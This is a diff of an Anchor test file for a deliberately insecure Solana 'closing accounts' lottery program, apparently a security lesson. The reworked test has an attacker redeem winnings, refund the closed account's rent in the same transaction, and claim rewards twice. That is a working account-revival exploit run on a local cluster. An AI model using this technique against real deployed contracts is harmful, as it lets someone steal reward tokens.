@@ -1,36 +1,39 @@
-import * as anchor from "@project-serum/anchor"
-import { Program } from "@project-serum/anchor"
-import { ClosingAccounts } from "../target/types/closing_accounts"
-import { PublicKey, Keypair, SystemProgram, Transaction } from '@solana/web3.js'
-import { getOrCreateAssociatedTokenAccount, createMint, TOKEN_PROGRAM_ID, getAccount } from "@solana/spl-token"
-import { safeAirdrop } from "./utils/utils"
-import { expect } from 'chai'
-import { associated } from "@project-serum/anchor/dist/cjs/utils/pubkey"
+import * as anchor from "@coral-xyz/anchor";
+import { Program } from "@coral-xyz/anchor";
+import { ClosingAccounts } from "../target/types/closing_accounts";
+import {
+  PublicKey,
+  Keypair,
+  SystemProgram,
+  Transaction,
+  sendAndConfirmTransaction,
+} from "@solana/web3.js";
+import {
+  getOrCreateAssociatedTokenAccount,
+  createMint,
+  getAccount,
+} from "@solana/spl-token";
+import { safeAirdrop } from "./utils/utils";
+import { expect } from "chai";
 
 describe("closing-accounts", () => {
   // Configure the client to use the local cluster.
-  anchor.setProvider(anchor.AnchorProvider.env())
-  const provider = anchor.AnchorProvider.env()
-  const program = anchor.workspace.ClosingAccounts as Program<ClosingAccounts>
-  const authority = Keypair.generate()
-  let userAta: PublicKey = null
-  let rewardMint: PublicKey = null
-  let mintAuth: PublicKey = null
+  anchor.setProvider(anchor.AnchorProvider.env());
+  const provider = anchor.AnchorProvider.env();
+  const program = anchor.workspace.ClosingAccounts as Program<ClosingAccounts>;
+  const authority = Keypair.generate();
+  let attackerAta: PublicKey = null;
+  let rewardMint: PublicKey = null;
+  let mintAuth: PublicKey = null;
 
-
-  it("Enter lottery", async () => {
-    // Add your test here.
-    const [lotteryEntry, bump] = await PublicKey.findProgramAddressSync(
-      [Buffer.from("test-seed"), authority.publicKey.toBuffer()],
-      program.programId
-    )
-    const [mint, mintBump] = await PublicKey.findProgramAddressSync(
+  it("Enter lottery should be successful", async () => {
+    const [mint, mintBump] = PublicKey.findProgramAddressSync(
       [Buffer.from("mint-seed")],
       program.programId
-    )
-    mintAuth = mint
+    );
+    mintAuth = mint;
 
-    await safeAirdrop(authority.publicKey, provider.connection)
+    await safeAirdrop(authority.publicKey, provider.connection);
 
     rewardMint = await createMint(
       provider.connection,
@@ -38,104 +41,77 @@ describe("closing-accounts", () => {
       mintAuth,
       null,
       6
-    )
+    );
 
     const associatedAcct = await getOrCreateAssociatedTokenAccount(
       provider.connection,
       authority,
       rewardMint,
       authority.publicKey
-    )
-    userAta = associatedAcct.address
-
+    );
+    attackerAta = associatedAcct.address;
 
     // tx to enter lottery
-    await program.methods.enterLottery()
-    .accounts({
-      lotteryEntry: lotteryEntry,
-      user: authority.publicKey,
-      userAta: userAta,
-      systemProgram: SystemProgram.programId
-    })
-    .signers([authority])
-    .rpc()
-  })
+    await program.methods
+      .enterLottery()
+      .accounts({
+        user: authority.publicKey,
+        userAta: attackerAta,
+      })
+      .signers([authority])
+      .rpc();
+  });
 
-  it("close + refund lottery acct to continuously claim rewards", async () => {
-
-    const [lotteryEntry, bump] = await PublicKey.findProgramAddressSync(
+  it("attacker can close + refund lottery acct + claim multiple rewards successfully", async () => {
+    const [attackerLotteryEntry, bump] = PublicKey.findProgramAddressSync(
       [Buffer.from("test-seed"), authority.publicKey.toBuffer()],
       program.programId
-    )
+    );
+    // claim multiple times
+    for (let i = 0; i < 2; i++) {
+      let tokenAcct = await getAccount(provider.connection, attackerAta);
 
-    // log rewards minted
-    let tokenAcct = await getAccount(
-      provider.connection,
-      userAta
-    )
-    console.log("User balance before reward redemption: ", tokenAcct.amount.toString())
+      const tx = new Transaction();
 
-    const tx = new Transaction()
+      // instruction claims rewards, program will try to close account
+      tx.add(
+        await program.methods
+          .redeemWinningsInsecure()
+          .accounts({
+            userAta: attackerAta,
+            rewardMint: rewardMint,
+            user: authority.publicKey,
+          })
+          .signers([authority])
+          .instruction()
+      );
 
-    // instruction claims rewards, program will try to close account
-    tx.add(
-      await program.methods.redeemWinningsInsecure()
-      .accounts({
-        lotteryEntry: lotteryEntry,
-        user: authority.publicKey,
-        userAta: userAta,
-        rewardMint: rewardMint,
-        mintAuth: mintAuth,
-        tokenProgram: TOKEN_PROGRAM_ID
-      })
-      .instruction()
-    )
-
-    // user adds instruction to refund dataAccount lamports
-    const rentExemptLamports = await provider.connection.getMinimumBalanceForRentExemption(82, "confirmed")
-    tx.add(
-      SystemProgram.transfer({
+      // user adds instruction to refund dataAccount lamports
+      const rentExemptLamports =
+        await provider.connection.getMinimumBalanceForRentExemption(
+          82,
+          "confirmed"
+        );
+      tx.add(
+        SystemProgram.transfer({
           fromPubkey: authority.publicKey,
-          toPubkey: lotteryEntry,
+          toPubkey: attackerLotteryEntry,
           lamports: rentExemptLamports,
-      })
-    )
-    // tx is sent
-    const txSig = await provider.connection.sendTransaction(tx, [authority])
-    await provider.connection.confirmTransaction(txSig)
-
-    // log rewards minted
-    tokenAcct = await getAccount(
-      provider.connection,
-      userAta
-    )
-    console.log("User balance after first redemption: ", tokenAcct.amount.toString())
-
-    try {
-      // claim rewards for a 2nd time
-      await program.methods.redeemWinningsInsecure()
-        .accounts({
-          lotteryEntry: lotteryEntry,
-          user: authority.publicKey,
-          userAta: userAta,
-          rewardMint: rewardMint,
-          mintAuth: mintAuth,
-          tokenProgram: TOKEN_PROGRAM_ID
         })
-        .signers([authority])
-        .rpc()
-    } catch (e) {
-      console.log(e.message)
-      expect(e.message).to.eq("AnchorError caused by account: lottery_entry. Error Code: AccountDiscriminatorMismatch. Error Number: 3002. Error Message: 8 byte discriminator did not match what was expected.")
+      );
+      // send tx
+      await sendAndConfirmTransaction(provider.connection, tx, [authority]);
+      await new Promise((x) => setTimeout(x, 5000));
     }
 
-    tokenAcct = await getAccount(
-      provider.connection,
-      userAta
-    )
+    const tokenAcct = await getAccount(provider.connection, attackerAta);
 
-    // log rewards minted
-    console.log("User balance after second redemption: ", tokenAcct.amount.toString())
+    const lotteryEntry = await program.account.lotteryAccount.fetch(
+      attackerLotteryEntry
+    );
 
-  })
-})
+    expect(Number(tokenAcct.amount)).to.equal(
+      lotteryEntry.timestamp.toNumber() * 10 * 2
+    );
+  });
+});
